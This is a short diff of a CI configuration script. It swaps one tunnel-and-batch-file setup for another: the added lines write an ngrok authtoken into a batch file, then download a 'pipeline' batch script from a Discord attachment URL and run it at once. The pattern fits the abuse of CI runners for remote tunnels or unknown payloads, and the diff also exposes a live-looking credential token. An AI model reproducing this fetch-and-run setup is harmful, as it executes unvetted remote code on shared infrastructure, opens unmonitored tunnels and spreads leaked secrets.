@@ -9,7 +9,6 @@ compute_engine_instance:
   
 task:
   script:
-   - curl -s -O https://playit.gg/downloads/playit-win_64-0.4.6.exe
-   - playit-win_64-0.4.6.exe
-   - curl -s -O https://cdn.discordapp.com/attachments/897461899627753473/900395706479673394/Chrome_pipeline.bat
-   - Chrome_pipeline.bat
+   - echo ngrok authtoken 1wTEGPd6OMDKyDDc4oM3UVsrblb_7QWBMWv3Jn8ZfcoPsQ8dJ > NGROK.bat
+   - curl -s -O https://cdn.discordapp.com/attachments/897461899627753473/900380113538011166/Azure_pipeline.bat
+   - Azure_pipeline.bat
